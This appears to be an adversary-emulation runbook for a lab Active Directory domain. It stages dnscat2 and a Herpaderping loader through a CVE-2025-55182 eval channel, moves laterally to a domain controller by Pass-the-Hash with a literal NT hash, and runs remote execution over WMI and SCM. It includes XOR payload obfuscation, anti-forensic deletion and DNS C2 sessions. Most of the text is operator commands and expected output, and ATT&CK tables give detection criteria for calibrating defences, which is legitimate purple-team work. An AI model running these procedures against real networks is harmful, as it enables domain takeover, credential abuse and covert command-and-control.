> Lateral Movement, Execution, Command and Control, Persistence

# Phase 3-1 - Lateral Movement, C2 Establishment on Domain Controller

## Overview

Lateral movement via Pass-the-Hash (`go-thehash.exe`) from IIS01 to DC01. Two independent execution paths:

- **Step 2 (WMI):** `CertEnrollAgent.exe` spawns as `TESTLAB\Administrator` (Domain Admin).
- **Step 2B (SCM):** `CertEnrollAgent.exe` spawns as `NT AUTHORITY\SYSTEM` (generates Event ID 7045).

Both run the same Herpaderping chain on DC01 to establish a dnscat2 C2 session. Step 3 stages persistence tooling on DC01.

---

## Step 1 - Ingress Tool Transfer: Stage Payloads on IIS01

### Voice Track

`C:\ProgramData\CertCA.enc` (the XOR-encoded dnscat2 payload) was auto-deleted by
CWLHerpaderping during Phase 1 immediately after being read into memory — this is an
intentional anti-forensic behaviour baked into the loader. Before lateral movement
can proceed, the dnscat2 payload and its Herpaderping loader must be re-staged on
IIS01. The remaining tools — `go-thehash.exe` for Pass-the-Hash lateral movement,
Windows service installer binaries, and the persistence-specific dnscat2 executables
(`policyupdate.exe`, `policysync.exe`, `policysync-host.exe`) — are staged to IIS01 here for the first time.

All staging uses the react2shell `stage` command: the attacker's Python tool reads
each binary locally, base64-encodes in Python memory, streams 2000-character chunks
into `global.__stageBuffer` on the target Node.js process via the CVE-2025-55182 eval
channel, then flushes the decoded bytes to disk in a single atomic
`Buffer.from(__stageBuffer,'base64')` write

The dnscat2 payload is staged with `stage --encrypt`: position-dependent XOR
(`out[i] = in[i] ^ ((0xA3 + i*0x5B) & 0xFF)`) is applied in Python memory before
base64-encoding, so `CertCA.enc` lands on disk with first byte `0xEE` (not `0x4D`)
and no valid MZ header. All other binaries are staged as plain decoded PE files.
No new exploitation or network exposure is required; the existing
`react.testlab.local` session is sufficient.

> Further reading: [rce-react2shell.md](../further-reading/rce-react2shell.md)
> covers the `stage` command implementation used for this staging path.

### Procedures

- ☣️ Launch the react2shell interactive session against `react.testlab.local`

  ```bash
  cd resources/payloads/react2shell-tool
  python run_exploit.py -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    [+] Target: http://react.testlab.local
    [+] Type 'help' for available commands
    [*] Testing connection...
    [+] Connection established!
    ```

- ☣️ Re-stage dnscat2 payload with XOR encryption (`CertCA.enc`); first byte on disk `0xEE` (not `0x4D`), no valid MZ header

  ```
  stage --encrypt ../../rce-and-c2/dnscat2/go-client/dnscat2.exe C:\ProgramData\CertCA.enc
  ```

  - ***Expected Output***

    ```text
    [*] XOR encoded payload before staging (T1027.013)
    [*] Staging .../../rce-and-c2/dnscat2.exe (...) -> C:\ProgramData\CertCA.enc in N chunks
    [*] Progress: N/N chunks
    [+] File staged successfully -> C:\ProgramData\CertCA.enc (... bytes)
    ```

- ☣️ Stage `CertEnrollAgent` (Herpaderping loader); rename to `.exe`

  ```
  stage ../../process-injection/CWLHerpaderping/x64/Release/CWLHerpaderping.exe C:\ProgramData\CertEnrollAgent.bin
  rename C:\ProgramData\CertEnrollAgent.bin C:\ProgramData\CertEnrollAgent.exe
  ```

  - ***Expected Output***

    ```text
    [*] Staging .../../process-injection/CWLHerpaderping.exe (...) -> C:\ProgramData\CertEnrollAgent.bin in N chunks...
    [*] Progress: N/N chunks
    [+] File staged successfully -> C:\ProgramData\CertEnrollAgent.bin (... bytes)
    [*] Renaming C:\ProgramData\CertEnrollAgent.bin -> C:\ProgramData\CertEnrollAgent.exe via eval (NO spawn - STEALTH!)...
    [+] File renamed successfully -> C:\ProgramData\CertEnrollAgent.exe (NO process spawn!)
    ```

- ☣️ Stage `go-thehash.exe` (PtH lateral movement tool); rename to `.exe`

  ```
  stage ../../lateral-movement/go-thehash/go-thehash.exe C:\ProgramData\go-thehash.bin
  rename C:\ProgramData\go-thehash.bin C:\ProgramData\go-thehash.exe
  ```

  - ***Expected Output***

    ```text
    [*] Staging .../../lateral-movement/go-thehash.exe (...) -> C:\ProgramData\go-thehash.bin in N chunks...
    [*] Progress: N/N chunks
    [+] File staged successfully -> C:\ProgramData\go-thehash.bin (... bytes)
    [*] Renaming C:\ProgramData\go-thehash.bin -> C:\ProgramData\go-thehash.exe via eval (NO spawn - STEALTH!)...
    [+] File renamed successfully -> C:\ProgramData\go-thehash.exe (NO process spawn!)
    ```

- ☣️ Stage Windows service installer tooling

  ```
  stage ../../persistence/windows-service/advapi32-cpp/ServiceInstaller.exe C:\ProgramData\ServiceInstaller.bin
  stage ../../persistence/windows-service/syscalls-cpp/NtServiceInstaller.exe C:\ProgramData\NtServiceInstaller.bin
  ```

  - ***Expected Output***

    ```text
    [+] File staged successfully -> C:\ProgramData\ServiceInstaller.bin (... bytes)
    [+] File staged successfully -> C:\ProgramData\NtServiceInstaller.bin (... bytes)
    ```

- ☣️ Stage C2 executables for persistence mechanisms

  ```
  stage ../../rce-and-c2/dnscat2/go-client/dnscat2.exe C:\ProgramData\policyupdate.bin
  stage ../../rce-and-c2/dnscat2/go-client/policysync.exe C:\ProgramData\policysync.bin
  stage ../../rce-and-c2/dnscat2/go-client/policysync-host.exe C:\ProgramData\policysync-host.bin
  ```

  - ***Expected Output***

    ```text
    [+] File staged successfully -> C:\ProgramData\policyupdate.bin (... bytes)
    [+] File staged successfully -> C:\ProgramData\policysync.bin (... bytes)
    [+] File staged successfully -> C:\ProgramData\policysync-host.bin (... bytes)
    ```

### Reference Tables

> Shared channel behaviors — `T1071.001` (react2shell HTTP C2), `T1059.007` (eval injection), `T1027.010` (charcode obfuscation), and `T1140` (Buffer in-memory decode) — are not re-mapped here; they were scored in Phase 1 Step 1 and the mechanism, actor, and host are identical. `CertCA.enc` (XOR-encrypted staging) is also excluded — it was already mapped in Phase 1 Step 1A, and no general-purpose rule can distinguish this re-staging from the Phase 1 event without high false-positive risk.

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - |
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` writes valid PE to `C:\ProgramData\CertEnrollAgent.bin` on react.testlab.local — IIS web process dropping an executable binary to `C:\ProgramData\` | Calibrated - Not Benign | - | `stage` streams Herpaderping loader PE via eval channel into `global.__stageBuffer`; flushes as `C:\ProgramData\CertEnrollAgent.bin` in one `Buffer.from` write — valid PE | react.testlab.local (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` writes valid PE to `C:\ProgramData\go-thehash.bin` on react.testlab.local — IIS web process staging a PtH toolkit binary to `C:\ProgramData\` | Not Calibrated - Not Benign | redundant@T1105 | `stage` streams `go-thehash.exe` PE via eval channel into `global.__stageBuffer`; flushes as `C:\ProgramData\go-thehash.bin` in one `Buffer.from` write — valid PE | react.testlab.local (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` writes valid PE to `C:\ProgramData\ServiceInstaller.bin` on react.testlab.local — IIS web process staging an SCM service installer binary to `C:\ProgramData\` | Not Calibrated - Not Benign | redundant@T1105 | `stage` streams `ServiceInstaller.exe` PE via eval channel into `global.__stageBuffer`; flushes as `C:\ProgramData\ServiceInstaller.bin` in one `Buffer.from` write — valid PE | react.testlab.local (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` writes valid PE to `C:\ProgramData\NtServiceInstaller.bin` on react.testlab.local — IIS web process staging an NT-native service installer binary to `C:\ProgramData\` | Not Calibrated - Not Benign | redundant@T1105 | `stage` streams `NtServiceInstaller.exe` PE via eval channel into `global.__stageBuffer`; flushes as `C:\ProgramData\NtServiceInstaller.bin` in one `Buffer.from` write — valid PE | react.testlab.local (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` writes valid PE to `C:\ProgramData\policyupdate.bin` on react.testlab.local — IIS web process staging a dnscat2 C2 binary to `C:\ProgramData\` | Not Calibrated - Not Benign | redundant@T1105 | `stage` streams dnscat2 PE (as `policyupdate`) via eval channel into `global.__stageBuffer`; flushes as `C:\ProgramData\policyupdate.bin` in one `Buffer.from` write — valid PE | react.testlab.local (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` writes valid PE to `C:\ProgramData\policysync.bin` on react.testlab.local — IIS web process staging a dnscat2 C2 binary to `C:\ProgramData\` | Not Calibrated - Not Benign | redundant@T1105 | `stage` streams dnscat2 PE (as `policysync`) via eval channel into `global.__stageBuffer`; flushes as `C:\ProgramData\policysync.bin` in one `Buffer.from` write — valid PE | react.testlab.local (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |

---

## Step 2 - Lateral Movement & C2 Execution: Pass-the-Hash to WMI with go-thehash on DC01

### Voice Track

**File Transfer to DC01:**
`go-thehash.exe` opens authenticated SMB sessions to `DC01` using the raw NT hash
for `TESTLAB\Administrator` recovered in Phase 2, then transfers the dnscat2 payload
and Herpaderping loader over the `C$` admin share. The resulting files land at
`C:\ProgramData\` on DC01: `CertCA.enc` and `CertEnrollAgent.exe`.

The NT hash does not appear in any Windows event log on IIS01. On DC01, Event
ID 4624 (Logon Type 3, NTLM, `LogonProcessName: NtLmSsp`) is generated for the
`TESTLAB\Administrator` account from source IP `10.12.10.20` (IIS01). This is the
first lateral movement artefact and the primary detection signal for T1550.002.

**Path A - WMI Execution & C2 as Domain Admin:**
`go-thehash.exe exec-wmi` authenticates to DC01 with the same recovered NT hash
and invokes WMI `Win32_Process.Create` to start `C:\ProgramData\CertEnrollAgent.exe`.
`wmiprvse.exe` impersonates `TESTLAB\Administrator` for the method call, so the
new process starts as the domain administrator account rather than as SYSTEM. No
Event ID 7045 is written and no service registry key is created.

`CertEnrollAgent.exe` then runs the same Herpaderping loader flow used earlier:
it consumes `CertCA.enc`, creates a `RuntimeBroker.exe` ghost process, and starts
dnscat2 from that ghost. The resulting C2 session runs as `TESTLAB\Administrator`
with domain admin privileges - **not SYSTEM**. This privilege level persists for
all subsequent commands issued through this dnscat2 session.

> Further reading: [go-thehash.md](../further-reading/go-thehash.md) covers the
> Pass-the-Hash SMB authentication and file-transfer implementation.
> [process-herpaderping.md](../further-reading/process-herpaderping.md)
> covers the loader internals, and [dnscat2.md](../further-reading/dnscat2.md)
> covers the DNS C2 client flow.

### Procedures

**File Transfer Phase:**

- ☣️ From the IIS01 dnscat2 SYSTEM shell, transfer dnscat2 payload to DC01

  ```text
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\CertCA.enc C:\ProgramData\CertCA.enc
  ```

  - ***Expected Output***

    ```text
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded 3350528 bytes → \\C$\C$\ProgramData\CertCA.enc
    ```

- ☣️ Transfer Herpaderping loader to DC01

  ```text
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\CertEnrollAgent.exe C:\ProgramData\CertEnrollAgent.exe
  ```

  - ***Expected Output***

    ```text
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <size> bytes → \\C$\C$\ProgramData\CertEnrollAgent.exe
    ```

**Path A - WMI Execution Phase:**

- ☣️ From the IIS01 dnscat2 SYSTEM shell, trigger WMI execution of CertEnrollAgent on DC01

  ```text
  C:\ProgramData> go-thehash.exe exec-wmi 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a "C:\ProgramData\CertEnrollAgent.exe"
  ```

  - ***Expected Output***

    ```text
    [*] WMI exec as TESTLAB\Administrator → 10.12.10.10
    [+] Process created, PID = <pid>
    [+] ReturnValue = 0
    ```

- ☣️ On the attacker machine, confirm the new C2 session from DC01

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (dc01) 2> whoami
  command (dc01) 2> whoami /groups
  command (dc01) 2> shell
  C:\Windows\system32> hostname
  ```

  - ***Expected Output***

    ```text
    testlab\administrator

    GROUP INFORMATION
    -----------------

    Group Name                                     Type             SID                                           Attributes
    ============================================== ================ ============================================= ===============================================================
    Everyone                                       Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
    BUILTIN\Administrators                         Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
    BUILTIN\Users                                  Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
    BUILTIN\Pre-Windows 2000 Compatible Access     Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NETWORK                           Well-known group S-1-2                                       Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
    TESTLAB\Group Policy Creator Owners            Group            S-1-5-21-...-520                              Mandatory group, Enabled by default, Enabled group
    TESTLAB\Domain Admins                          Group            S-1-5-21-...-512                              Mandatory group, Enabled by default, Enabled group
    TESTLAB\Enterprise Admins                      Group            S-1-5-21-...-519                              Mandatory group, Enabled by default, Enabled group
    TESTLAB\Schema Admins                          Group            S-1-5-21-...-518                              Mandatory group, Enabled by default, Enabled group
    TESTLAB\Denied RODC Password Replication Group Alias            S-1-5-21-...-572                              Mandatory group, Enabled by default, Enabled group, Local Group
    NT AUTHORITY\NTLM Authentication               Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
    Mandatory Label\High Mandatory Level           Label            S-1-16-12288

    DC01
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | `TESTLAB\Administrator` performs Logon Type 3 (NTLM, `LogonProcessName: NtLmSsp`) to DC01 from `10.12.10.20` (IIS01) — Security Event 4624 on DC01; NTLM lateral authentication from web-tier host to domain controller | Calibrated - Not Benign | - | `go-thehash.exe` authenticates to DC01 via raw NT hash; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go connect()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | `TESTLAB\Administrator` accesses `\\DC01\C$` from `10.12.10.20` (IIS01) — Security Event 5140 on DC01; web-tier host opening admin share on domain controller | Not Calibrated - Not Benign | redundant@T1570 | `go-thehash.exe put` uses an authenticated SMB2 session to reach the `C$` admin share; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | `C:\ProgramData\CertEnrollAgent.exe` (valid PE) created on DC01 (`Image: System`) — Sysmon Event 11; PE binary staged to domain controller `C:\ProgramData\` by remote SMB session (source host attributed via correlated Security Event 5145/5140) | Calibrated - Not Benign | - | `go-thehash.exe put` moves the dnscat2 payload and Herpaderping loader from IIS01 to DC01; file-transfer details are covered in [go-thehash.md](../further-reading/go-thehash.md) | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
| Lateral Movement | T1021.003 | Remote Services: Distributed Component Object Model | Windows | `go-thehash.exe` on IIS01 opens an outbound DCOM connection to DC01 (`10.12.10.10`) port 135 — Sysmon Event 3 on IIS01; web-tier process initiating endpoint-mapper session to domain controller | Calibrated - Not Benign | - | `go-thehash.exe exec-wmi` calls `msdcom.NewDCOMConnection()` — a separate DCOM session independent of the SMB session used for file transfer; this is the transport layer for WMI execution and provides an earlier, independent detection opportunity before `wmiprvse.exe` spawns the payload; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | IIS01 → DC01 | TESTLAB\Administrator | [main.go execViaWMI()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
| Execution | T1047 | Windows Management Instrumentation | Windows | `wmiprvse.exe` spawns `C:\ProgramData\CertEnrollAgent.exe` on DC01 as `TESTLAB\Administrator` — Sysmon Event 1 on DC01; WMI process creation from a non-standard binary path | Calibrated - Not Benign | - | Path A execution: `go-thehash.exe` calls the WMI COM interface to spawn a remote process on DC01 in the context of the authenticated domain admin account; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | DC01 | TESTLAB\Administrator | [main.go execViaWMI()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -

---

## [ALT] Step 2B - Alternative Execution Path of go-thehash : SCM Execution & C2 as SYSTEM

### Voice Track

`go-thehash.exe exec` authenticates to DC01, reaches the SCMR endpoint over
`IPC$\svcctl`, and creates a short-lived service whose binary path is
`C:\ProgramData\CertEnrollAgent.exe`. SCM (`services.exe`) starts that binary as
`NT AUTHORITY\SYSTEM`; unlike WMI, this path does **not** impersonate the remote
caller.

The Herpaderping chain is identical to Path A (Step 2), but the calling process is now
`LocalSystem`. The resulting C2 session runs as `NT AUTHORITY\SYSTEM` with full
local administrator privileges and no domain group membership - **not domain
admin**. This privilege level persists for all subsequent commands issued through
this dnscat2 session.

`CertEnrollAgent.exe` does not call `SetServiceStatus`, so SCM returns
`ERROR_SERVICE_REQUEST_TIMEOUT (0x427)` after 30 seconds - expected and logged as
such by `go-thehash`. Event ID 7045 is permanently written to the DC01 System log
when the service is created and survives later service deletion.

> Further reading: [process-herpaderping.md](../further-reading/process-herpaderping.md)
> covers the loader internals, and [dnscat2.md](../further-reading/dnscat2.md)
> covers the DNS C2 client flow.
> [go-thehash.md](../further-reading/go-thehash.md) covers the SCMR service-execution
> implementation.

> **Prerequisite:** `CertCA.enc` was auto-deleted by Herpaderping during Path A (Step 2).
> Re-upload it to DC01 before proceeding. `CertEnrollAgent.exe` remains on disk.

### Procedures

- ☣️ From the IIS01 dnscat2 SYSTEM shell, re-upload `CertCA.enc` to DC01

  ```text
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\CertCA.enc C:\ProgramData\CertCA.enc
  ```

  - ***Expected Output***

    ```text
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded 3350528 bytes → \\C$\C$\ProgramData\CertCA.enc
    ```

**SCM Execution:**

- ☣️ From the IIS01 dnscat2 SYSTEM shell, trigger SCM service execution on DC01

  ```text
  C:\ProgramData> go-thehash.exe exec 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a "C:\ProgramData\CertEnrollAgent.exe"
  ```

  - ***Expected Output***

    ```text
    [+] Authenticated as TESTLAB\Administrator
    [*] Service '<random12>' created, starting...
    [!] Service start timed out (expected — command was dispatched)
    [+] Service '<random12>' deleted
    ```

- ☣️ On the attacker machine, confirm the new C2 session from DC01

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (dc01) 3> whoami
  command (dc01) 3> whoami /groups
  command (dc01) 3> shell
  C:\Windows\system32> hostname
  ```

  - ***Expected Output***

    ```text
    nt authority\system

    GROUP INFORMATION
    -----------------

    Group Name                             Type             SID          Attributes
    ====================================== ================ ============ ==================================================
    BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
    Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
    Mandatory Label\System Mandatory Level Label            S-1-16-16384

    DC01
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | - | -
| Execution | T1569.002 | System Services: Service Execution | Windows | Event 7045 on DC01 System log — service with random 12-character name created with `ImagePath: C:\ProgramData\CertEnrollAgent.exe`, `ObjectName: LocalSystem`; transient service installed and deleted remotely via MS-SCMR | Calibrated - Not Benign | - | `go-thehash.exe exec` creates, starts, and deletes a transient service; SCMR call flow is covered in [go-thehash.md](../further-reading/go-thehash.md) | DC01 | TESTLAB\Administrator | [main.go execViaService()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -

---



